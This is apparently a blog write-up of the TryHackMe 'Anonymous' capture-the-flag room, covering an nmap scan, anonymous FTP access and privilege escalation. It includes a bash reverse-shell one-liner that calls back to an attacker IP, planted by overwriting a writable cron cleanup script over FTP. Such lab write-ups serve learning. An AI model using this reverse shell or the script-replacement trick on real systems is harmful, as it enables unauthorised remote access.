---
title: Anonymous
layout: post
author: Bit Criminals Team
date: 2021-07-27 17:02:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://tryhackme.com/room/anonymous
---

## STEP_1 ==> NMAP SCAN
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 18:43 IST
Nmap scan report for 10.10.148.11
Host is up (0.20s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
try open ftp server

## STEP_2 ==> FTP SERVER

![](/images/otaku_/Anonymous_ftp.png) 

download the given files by command
>get [FILE NAME]
  
## STEP_3 ==> OPEN FILES AND SHELL

### clean.sh
```
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

```
here we find that this sh file is exexuting on server every time so we change this file

```

#!/bin/bash
bash -i >& /dev/tcp/10.9.3.13/4242 0>&1
```

putting this file on server by using command
>put clean.sh clean.sh

## STEP_4 ==> USER AND ROOT 

set off linPEAS - this actually highlighted our privilage escalation vector.
refer ->  https://gtfobins.github.io/gtfobins/env/

![](/images/otaku_/Anonymous_flag.png)
 

>--------------------------------------------------------